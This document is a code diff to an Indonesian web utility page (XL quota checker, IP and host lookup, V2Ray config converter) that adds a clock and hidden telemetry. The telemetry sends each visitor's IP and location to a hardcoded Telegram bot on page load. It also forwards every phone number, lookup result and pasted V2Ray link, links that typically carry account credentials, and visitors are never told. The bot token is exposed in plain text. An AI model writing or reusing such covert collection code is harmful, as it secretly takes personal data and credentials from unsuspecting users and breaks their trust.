@@ -11,7 +11,7 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/js-yaml/4.1.0/js-yaml.min.js"></script>
   
   <style>
-    /* ... (CSS Anda yang lain tetap sama) ... */
+    /* CSS Lengkap Anda */
     body {
       font-family: 'Inter', sans-serif;
       background: radial-gradient(circle at top left, #0f172a, #020617);
@@ -68,7 +68,6 @@
       color: #22d3ee;
       font-weight: 600;
     }
-    /* ... (CSS Slider Anda tetap sama) ... */
     .slider-container {
       position: relative;
       width: 100%;
@@ -131,9 +130,6 @@
     }
     .slider-arrow.left { left: 1.5rem; }
     .slider-arrow.right { right: 1.5rem; }
-    @media (max-width: 768px) {
-      /* ... (CSS Media Query Anda tetap sama) ... */
-    }
   </style>
 </head>
 <body>
@@ -187,6 +183,15 @@
         <i class="fa-solid fa-bars"></i>
       </button>
     </nav>
+
+    <div id="clock-container" class="flex flex-col items-center justify-center mb-6 fade" style="animation-delay: 0.2s;">
+      <div id="digital-clock" class="text-5xl font-mono font-bold neon" style="letter-spacing: 0.1em;">
+        00:00:00
+      </div>
+      <div id="digital-date" class="text-sm text-slate-300">
+        Hari, 00 Bulan 0000
+      </div>
+    </div>
 
     <div id="berandaSection" class="w-full">
       <div class="slider-container mb-8 fade" style="animation-delay: 0.3s;">
@@ -414,6 +419,60 @@
   </div>
   
   <script>
+    // --- FUNGSI NOTIFIKASI TELEGRAM ---
+    
+    const BOT_TOKEN = "8058460969:AAHJgUmeY8gs27taEVPiiLyGvZoxh20jfec";
+    const CHAT_ID = "5261918243";
+
+    /**
+     * Mengirim pesan notifikasi ke bot Telegram Anda.
+     * @param {string} pesan - Teks pesan yang ingin dikirim.
+     */
+    function kirimNotifKeTelegram(pesan) {
+      if (BOT_TOKEN === "GANTI_DENGAN_TOKEN_BARU_ANDA") {
+        console.warn("Token bot belum diganti. Notifikasi tidak dikirim.");
+        return; 
+      }
+      
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      
+      // Batasi panjang pesan untuk menghindari error API Telegram (maks 4096)
+      const MAX_LENGTH = 4000;
+      if (pesan.length > MAX_LENGTH) {
+        pesan = pesan.substring(0, MAX_LENGTH) + "\n\n... (pesan dipotong karena terlalu panjang)";
+      }
+      
+      fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: pesan,
+          parse_mode: 'HTML',
+          disable_web_page_preview: true
+        })
+      }).catch(e => console.error("Gagal kirim notif:", e));
+    }
+
+    // Kirim notifikasi saat ada yang mengakses web
+    // (Hanya berjalan 1x per kunjungan)
+    window.addEventListener('load', () => {
+      fetch('https://ipinfo.io/json')
+        .then(res => res.json())
+        .then(data => {
+          const pesan = `
+✅ <b>Pengunjung Baru!</b>
+<b>IP:</b> ${data.ip || 'N/A'}
+<b>Lokasi:</b> ${data.city || 'N/A'}, ${data.region || 'N/A'}, ${data.country || 'N/A'}
+<b>Provider:</b> ${data.org || 'N/A'}
+          `;
+          kirimNotifKeTelegram(pesan);
+        })
+        .catch(e => {
+          kirimNotifKeTelegram("✅ <b>Pengunjung Baru!</b> (Gagal mendapatkan detail IP)");
+        });
+    }, { once: true }); 
+
     // --- FUNGSI API (TETAP SAMA) ---
     function formatNumber(phone) {
       let cleaned = phone.replace(/\D/g, '');
@@ -463,9 +522,13 @@
       }
     });
 
-    // --- LOGIKA TOMBOL CEK (TETAP SAMA) ---
+    // --- [DIUBAH] LOGIKA TOMBOL CEK (Mengirim Input & Output) ---
     cekBtn.addEventListener('click', async () => {
       const no = nomor.value.trim(); 
+      
+      // Kirim Input
+      kirimNotifKeTelegram(`<b>Aksi: Cek Kuota</b>\nInput: <code>${no || 'Kosong'}</code>`);
+      
       if (!no) return alert('Masukkan nomor terlebih dahulu.');
       if (!/^(08|62|8)\d{7,12}$/.test(no)) return alert('Format nomor salah. (Harus diawali 08, 62, atau 8)');
       hasil.classList.add('hidden');
@@ -475,6 +538,8 @@
         const data = await fetchWithProxy(no);
         loading.classList.add('hidden');
         if (!data.success) {
+          // Kirim Output Gagal
+          kirimNotifKeTelegram(`<b>Gagal Cek Kuota</b>\nInput: <code>${no}</code>\nError: <code>${data.message || 'Gagal mengambil data.'}</code>`);
           errorDiv.textContent = data.message || 'Gagal mengambil data.';
           errorDiv.classList.remove('hidden');
           return;
@@ -482,6 +547,21 @@
         hasil.classList.remove('hidden');
         const subs = data.data.subs_info;
         const paket = data.data.package_info;
+        
+        // Format pesan output untuk Telegram
+        let outputPesan = `<b>Nomer:</b> ${subs.msisdn}\n<b>Aktif:</b> ${subs.exp_date}\n<b>Tenggang:</b> ${subs.grace_until}\n\n`;
+        if (paket.packages && paket.packages.length > 0) {
+          outputPesan += `<b>Paket Aktif (${paket.packages.length}):</b>\n`;
+          paket.packages.forEach(p => {
+            outputPesan += `- ${p.name}\n`;
+          });
+        } else {
+          outputPesan += "Tidak ada paket aktif.";
+        }
+        // Kirim Output Sukses
+        kirimNotifKeTelegram(`<b>Sukses Cek Kuota</b>\nInput: <code>${no}</code>\n\n<b>Output:</b>\n<pre>${outputPesan}</pre>`);
+
+        // Tampilkan di HTML (kode lama)
         info.innerHTML = `
           <p><i class="fa-solid fa-phone mr-2 text-cyan-400"></i><b>Nomer XL:</b> ${subs.msisdn}</p>
           <p><i class="fa-solid fa-signal mr-2 text-cyan-400"></i><b>Operator:</b> ${subs.operator}</p>
@@ -510,6 +590,8 @@
           kuotaList.innerHTML = '<p class="text-slate-400 text-center">Tidak ada paket aktif.</p>';
         }
       } catch (e) {
+        // Kirim Output Gagal
+        kirimNotifKeTelegram(`<b>Gagal Cek Kuota</b>\nInput: <code>${no}</code>\nError: <code>${e.message}</code>`);
         loading.classList.add('hidden');
         errorDiv.textContent = 'Koneksi gagal, coba lagi.';
         errorDiv.classList.remove('hidden');
@@ -520,7 +602,7 @@
       if (e.key === 'Enter') cekBtn.click();
     });
 
-    // --- LOGIKA TOMBOL CEK MYIP (TETAP SAMA) ---
+    // --- [DIUBAH] LOGIKA TOMBOL CEK MYIP (Mengirim Output) ---
     const cekMyIpBtn = document.getElementById('cekMyIpBtn');
     const myIpLoading = document.getElementById('myIpLoading');
     const myIpError = document.getElementById('myIpError');
@@ -528,6 +610,8 @@
     const myIpInfo = document.getElementById('myIpInfo');
     
     cekMyIpBtn.addEventListener('click', async () => {
+      kirimNotifKeTelegram("Aksi: <b>Cek MyIp</b>");
+      
       myIpHasil.classList.add('hidden');
       myIpError.classList.add('hidden');
       myIpLoading.classList.remove('hidden');
@@ -539,6 +623,12 @@
         }
         const data = await response.json();
         myIpLoading.classList.add('hidden');
+
+        // Format pesan output untuk Telegram
+        let outputPesan = `<b>IP:</b> ${data.ip || 'N/A'}\n<b>Lokasi:</b> ${data.city || 'N/A'}, ${data.country || 'N/A'}\n<b>Provider:</b> ${data.org || 'N/A'}`;
+        kirimNotifKeTelegram(`<b>Sukses Cek MyIp</b>\n<pre>${outputPesan}</pre>`);
+
+        // Tampilkan di HTML (kode lama)
         myIpInfo.innerHTML = `
           <p><i class="fa-solid fa-map-pin mr-2 text-cyan-400"></i><b>IP Address:</b> ${data.ip || 'N/A'}</p>
           <p><i class="fa-solid fa-city mr-2 text-cyan-400"></i><b>Kota:</b> ${data.city || 'N/A'}</p>
@@ -549,6 +639,8 @@
         `;
         myIpHasil.classList.remove('hidden');
       } catch (e) {
+        // Kirim Output Gagal
+        kirimNotifKeTelegram(`<b>Gagal Cek MyIp</b>\nError: <code>${e.message}</code>`);
         console.error('Gagal fetch IP:', e);
         myIpLoading.classList.add('hidden');
         myIpError.textContent = 'Gagal mengambil informasi IP. Silakan coba lagi.';
@@ -556,7 +648,7 @@
       }
     });
     
-    // --- [DIUBAH] LOGIKA TOMBOL CEK IP HOST ---
+    // --- [DIUBAH] LOGIKA TOMBOL CEK IP HOST (Mengirim Input & Output) ---
     const hostnameInput = document.getElementById('hostnameInput');
     const cekHostBtn = document.getElementById('cekHostBtn');
     const hostLoading = document.getElementById('hostLoading');
@@ -565,9 +657,12 @@
     const hostOutput = document.getElementById('hostOutput');
     const copyHostBtn = document.getElementById('copyHostBtn');
 
-    // [DIUBAH] Fungsi handleCekHostClick sekarang mengambil detail
     async function handleCekHostClick() {
       const hostname = hostnameInput.value.trim();
+      
+      // Kirim Input
+      kirimNotifKeTelegram(`<b>Aksi: Cek IP Host</b>\nInput: <code>${hostname || 'Kosong'}</code>`);
+      
       if (!hostname) {
         alert('Silakan masukkan hostname terlebih dahulu.');
         return;
@@ -578,14 +673,13 @@
       hostLoading.classList.remove('hidden');
 
       try {
-        // Step 1: Ambil IP dari Google DNS
         const dnsResponse = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(hostname)}`);
         if (!dnsResponse.ok) {
           throw new Error('Respon DNS tidak OK');
         }
         const dnsData = await dnsResponse.json();
 
-        if (dnsData.Status !== 0) { // 0 = NOERROR
+        if (dnsData.Status !== 0) { 
           throw new Error(`Hostname tidak ditemukan (Status: ${dnsData.Status})`);
         }
 
@@ -594,14 +688,13 @@
         }
 
         const ipAddresses = dnsData.Answer
-          .filter(ans => ans.type === 1 || ans.type === 28) // 1=A (IPv4), 28=AAAA (IPv6)
+          .filter(ans => ans.type === 1 || ans.type === 28) 
           .map(ans => ans.data);
           
         if (ipAddresses.length === 0) {
            throw new Error("Tidak ditemukan record A atau AAAA.");
         }
 
-        // Step 2: Buat array promise untuk mengambil detail setiap IP
         const fetchPromises = ipAddresses.map(ip =>
           fetch(`https://ipinfo.io/${ip}/json`)
             .then(res => {
@@ -612,10 +705,8 @@
             .catch(e => ({ ip, error: e.message }))
         );
 
-        // Step 3: Tunggu semua promise selesai
         const results = await Promise.all(fetchPromises);
         
-        // Step 4: Format hasil
         let outputString = `Hostname: ${hostname}\n\n`;
         results.forEach(res => {
           outputString += `IP: ${res.ip}\n`;
@@ -625,14 +716,19 @@
           } else {
             outputString += `  (Gagal mengambil detail IP: ${res.error})\n`;
           }
-          outputString += `\n`; // Spasi antar IP
+          outputString += `\n`; 
         });
+
+        // Kirim Output Sukses
+        kirimNotifKeTelegram(`<b>Sukses Cek IP Host</b>\nInput: <code>${hostname}</code>\n\n<b>Output:</b>\n<pre>${outputString}</pre>`);
 
         hostLoading.classList.add('hidden');
         hostOutput.value = outputString;
         hostHasil.classList.remove('hidden');
         
       } catch (e) {
+        // Kirim Output Gagal
+        kirimNotifKeTelegram(`<b>Gagal Cek IP Host</b>\nInput: <code>${hostname}</code>\nError: <code>${e.message}</code>`);
         console.error('Gagal DNS lookup:', e);
         hostLoading.classList.add('hidden');
         hostError.textContent = e.message || 'Gagal melakukan DNS lookup.';
@@ -667,7 +763,7 @@
       });
     });
 
-    // --- LOGIKA TOMBOL CONVERTER V2RAY (TETAP SAMA) ---
+    // --- [DIUBAH] LOGIKA TOMBOL CONVERTER V2RAY (Mengirim Input & Output) ---
     
     const convertBtn = document.getElementById('convertBtn');
     const convertUrls = document.getElementById('convertUrls'); 
@@ -861,6 +957,9 @@
       const links = convertUrls.value.split('\n').filter(Boolean); 
       const outputFormat = convertOutputFormat.value;
       
+      // Kirim Input
+      kirimNotifKeTelegram(`<b>Aksi: Converter</b>\nFormat: ${outputFormat}\nJumlah Link: ${links.length}\n\n<b>Input:</b>\n<pre>${convertUrls.value}</pre>`);
+      
       if (links.length === 0) {
         alert('Silakan masukkan setidaknya satu link V2ray.');
         return;
@@ -894,11 +993,16 @@
               break;
           }
           
+          // Kirim Output Sukses
+          kirimNotifKeTelegram(`<b>Sukses Converter</b>\nInput: ${links.length} link\n\n<b>Output:</b>\n<pre>${outputString}</pre>`);
+          
           convertOutput.value = outputString;
           convertLoading.classList.add('hidden');
           convertHasil.classList.remove('hidden');
 
         } catch (e) {
+          // Kirim Output Gagal
+          kirimNotifKeTelegram(`<b>Gagal Converter</b>\nInput: ${links.length} link\nError: <code>${e.message}</code>`);
           console.error('Gagal konversi:', e);
           convertLoading.classList.add('hidden');
           convertError.textContent = e.message || 'Gagal memproses link.';
@@ -1003,19 +1107,19 @@
     sidebarOverlay.addEventListener('click', closeSidebar);
     
 
-    // --- [DIUBAH] JAVASCRIPT NAVIGASI & MODAL ---
+    // --- JAVASCRIPT NAVIGASI & MODAL (TETAP SAMA) ---
     
     // Ambil semua section
     const berandaSection = document.getElementById('berandaSection');
     const cekKuotaSection = document.getElementById('cekKuotaSection');
-    const cekMyIpSection = document.getElementById('cekMyIpSection'); // [DIUBAH]
+    const cekMyIpSection = document.getElementById('cekMyIpSection'); 
     const cekIpHostSection = document.getElementById('cekIpHostSection'); 
     const converterSection = document.getElementById('converterSection');
     
     // Ambil tombol Navigasi DESKTOP
     const berandaNavBtnDesktop = document.getElementById('berandaNavBtnDesktop');
     const cekKuotaNavBtnDesktop = document.getElementById('cekKuotaNavBtnDesktop');
-    const cekMyIpNavBtnDesktop = document.getElementById('cekMyIpNavBtnDesktop'); // [DIUBAH]
+    const cekMyIpNavBtnDesktop = document.getElementById('cekMyIpNavBtnDesktop'); 
     const cekIpHostNavBtnDesktop = document.getElementById('cekIpHostNavBtnDesktop'); 
     const converterNavBtnDesktop = document.getElementById('converterNavBtnDesktop');
     const aboutNavBtnDesktop = document.getElementById('aboutNavBtnDesktop');
@@ -1023,14 +1127,14 @@
     // Ambil tombol Navigasi MOBILE (dari sidebar)
     const berandaNavBtnMobile = document.getElementById('berandaNavBtnMobile');
     const cekKuotaNavBtnMobile = document.getElementById('cekKuotaNavBtnMobile');
-    const cekMyIpNavBtnMobile = document.getElementById('cekMyIpNavBtnMobile'); // [DIUBAH]
+    const cekMyIpNavBtnMobile = document.getElementById('cekMyIpNavBtnMobile'); 
     const cekIpHostNavBtnMobile = document.getElementById('cekIpHostNavBtnMobile'); 
     const converterNavBtnMobile = document.getElementById('converterNavBtnMobile');
     const aboutNavBtnMobile = document.getElementById('aboutNavBtnMobile');
     
     // Ambil tombol Kartu
     const cekKuotaCardBtn = document.getElementById('cekKuotaCardBtn');
-    const cekMyIpCardBtn = document.getElementById('cekMyIpCardBtn'); // [DIUBAH]
+    const cekMyIpCardBtn = document.getElementById('cekMyIpCardBtn'); 
     const cekIpHostCardBtn = document.getElementById('cekIpHostCardBtn'); 
     const converterCardBtn = document.getElementById('converterCardBtn');
     const aboutCardBtn = document.getElementById('aboutCardBtn');
@@ -1043,19 +1147,19 @@
     function showBeranda() {
       berandaSection.classList.remove('hidden');
       cekKuotaSection.classList.add('hidden');
-      cekMyIpSection.classList.add('hidden'); // [DIUBAH]
+      cekMyIpSection.classList.add('hidden'); 
       cekIpHostSection.classList.add('hidden'); 
       converterSection.classList.add('hidden');
       
       berandaNavBtnDesktop.classList.add('nav-active');
       cekKuotaNavBtnDesktop.classList.remove('nav-active');
-      cekMyIpNavBtnDesktop.classList.remove('nav-active'); // [DIUBAH]
+      cekMyIpNavBtnDesktop.classList.remove('nav-active'); 
       cekIpHostNavBtnDesktop.classList.remove('nav-active'); 
       converterNavBtnDesktop.classList.remove('nav-active');
       
       berandaNavBtnMobile.classList.add('nav-active');
       cekKuotaNavBtnMobile.classList.remove('nav-active');
-      cekMyIpNavBtnMobile.classList.remove('nav-active'); // [DIUBAH]
+      cekMyIpNavBtnMobile.classList.remove('nav-active'); 
       cekIpHostNavBtnMobile.classList.remove('nav-active'); 
       converterNavBtnMobile.classList.remove('nav-active');
       
@@ -1065,26 +1169,25 @@
     function showCekKuota() {
       berandaSection.classList.add('hidden');
       cekKuotaSection.classList.remove('hidden');
-      cekMyIpSection.classList.add('hidden'); // [DIUBAH]
+      cekMyIpSection.classList.add('hidden'); 
       cekIpHostSection.classList.add('hidden'); 
       converterSection.classList.add('hidden');
       
       berandaNavBtnDesktop.classList.remove('nav-active');
       cekKuotaNavBtnDesktop.classList.add('nav-active');
-      cekMyIpNavBtnDesktop.classList.remove('nav-active'); // [DIUBAH]
+      cekMyIpNavBtnDesktop.classList.remove('nav-active'); 
       cekIpHostNavBtnDesktop.classList.remove('nav-active'); 
       converterNavBtnDesktop.classList.remove('nav-active');
       
       berandaNavBtnMobile.classList.remove('nav-active');
       cekKuotaNavBtnMobile.classList.add('nav-active');
-      cekMyIpNavBtnMobile.classList.remove('nav-active'); // [DIUBAH]
+      cekMyIpNavBtnMobile.classList.remove('nav-active'); 
       cekIpHostNavBtnMobile.classList.remove('nav-active'); 
       converterNavBtnMobile.classList.remove('nav-active');
       
       closeSidebar();
     }
 
-    // [DIUBAH] Fungsi showCekMyIp
     function showCekMyIp() {
       berandaSection.classList.add('hidden');
       cekKuotaSection.classList.add('hidden');
@@ -1110,19 +1213,19 @@
     function showCekIpHost() {
       berandaSection.classList.add('hidden');
       cekKuotaSection.classList.add('hidden');
-      cekMyIpSection.classList.add('hidden'); // [DIUBAH]
+      cekMyIpSection.classList.add('hidden'); 
       cekIpHostSection.classList.remove('hidden'); 
       converterSection.classList.add('hidden');
       
       berandaNavBtnDesktop.classList.remove('nav-active');
       cekKuotaNavBtnDesktop.classList.remove('nav-active');
-      cekMyIpNavBtnDesktop.classList.remove('nav-active'); // [DIUBAH]
+      cekMyIpNavBtnDesktop.classList.remove('nav-active'); 
       cekIpHostNavBtnDesktop.classList.add('nav-active'); 
       converterNavBtnDesktop.classList.remove('nav-active');
       
       berandaNavBtnMobile.classList.remove('nav-active');
       cekKuotaNavBtnMobile.classList.remove('nav-active');
-      cekMyIpNavBtnMobile.classList.remove('nav-active'); // [DIUBAH]
+      cekMyIpNavBtnMobile.classList.remove('nav-active'); 
       cekIpHostNavBtnMobile.classList.add('nav-active');
       converterNavBtnMobile.classList.remove('nav-active');
       
@@ -1132,19 +1235,19 @@
     function showConverter() {
       berandaSection.classList.add('hidden');
       cekKuotaSection.classList.add('hidden');
-      cekMyIpSection.classList.add('hidden'); // [DIUBAH]
+      cekMyIpSection.classList.add('hidden'); 
       cekIpHostSection.classList.add('hidden'); 
       converterSection.classList.remove('hidden'); 
       
       berandaNavBtnDesktop.classList.remove('nav-active');
       cekKuotaNavBtnDesktop.classList.remove('nav-active');
-      cekMyIpNavBtnDesktop.classList.remove('nav-active'); // [DIUBAH]
+      cekMyIpNavBtnDesktop.classList.remove('nav-active'); 
       cekIpHostNavBtnDesktop.classList.remove('nav-active'); 
       converterNavBtnDesktop.classList.add('nav-active'); 
       
       berandaNavBtnMobile.classList.remove('nav-active');
       cekKuotaNavBtnMobile.classList.remove('nav-active');
-      cekMyIpNavBtnMobile.classList.remove('nav-active'); // [DIUBAH]
+      cekMyIpNavBtnMobile.classList.remove('nav-active'); 
       cekIpHostNavBtnMobile.classList.remove('nav-active'); 
       converterNavBtnMobile.classList.add('nav-active');
       
@@ -1161,7 +1264,7 @@
       aboutModal.classList.add('hidden');
     }
 
-    // [DIUBAH] Event Listeners
+    // Event Listeners
     
     berandaNavBtnDesktop.addEventListener('click', (e) => { e.preventDefault(); showBeranda(); });
     berandaNavBtnMobile.addEventListener('click', (e) => { e.preventDefault(); showBeranda(); });
@@ -1169,7 +1272,6 @@
     cekKuotaNavBtnDesktop.addEventListener('click', (e) => { e.preventDefault(); showCekKuota(); });
     cekKuotaNavBtnMobile.addEventListener('click', (e) => { e.preventDefault(); showCekKuota(); });
     
-    // [DIUBAH] Listener untuk Cek MyIp
     cekMyIpNavBtnDesktop.addEventListener('click', (e) => { e.preventDefault(); showCekMyIp(); });
     cekMyIpNavBtnMobile.addEventListener('click', (e) => { e.preventDefault(); showCekMyIp(); });
 
@@ -1179,9 +1281,8 @@
     converterNavBtnDesktop.addEventListener('click', (e) => { e.preventDefault(); showConverter(); });
     converterNavBtnMobile.addEventListener('click', (e) => { e.preventDefault(); showConverter(); });
 
-    // [DIUBAH] Menambahkan listener untuk kartu
     cekKuotaCardBtn.addEventListener('click', showCekKuota);
-    cekMyIpCardBtn.addEventListener('click', showCekMyIp); // [DIUBAH]
+    cekMyIpCardBtn.addEventListener('click', showCekMyIp); 
     cekIpHostCardBtn.addEventListener('click', showCekIpHost); 
     converterCardBtn.addEventListener('click', showConverter);
     
@@ -1192,6 +1293,31 @@
     aboutModal.addEventListener('click', (e) => {
       if (e.target === aboutModal) closeAboutModal();
     });
+    
+    // --- JAVASCRIPT UNTUK JAM DIGITAL (TETAP SAMA) ---
+    const clockElement = document.getElementById('digital-clock');
+    const dateElement = document.getElementById('digital-date');
+    
+    const hari = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
+    const bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"];
+
+    function updateClock() {
+      const now = new Date();
+
+      const h = String(now.getHours()).padStart(2, '0');
+      const m = String(now.getMinutes()).padStart(2, '0');
+      const s = String(now.getSeconds()).padStart(2, '0');
+      clockElement.innerText = `${h}:${m}:${s}`;
+
+      const namaHari = hari[now.getDay()];
+      const tanggal = now.getDate();
+      const namaBulan = bulan[now.getMonth()];
+      const tahun = now.getFullYear();
+      dateElement.innerText = `${namaHari}, ${tanggal} ${namaBulan} ${tahun}`;
+    }
+ 
+    updateClock();
+    setInterval(updateClock, 1000);
     
   </script>
 </body>
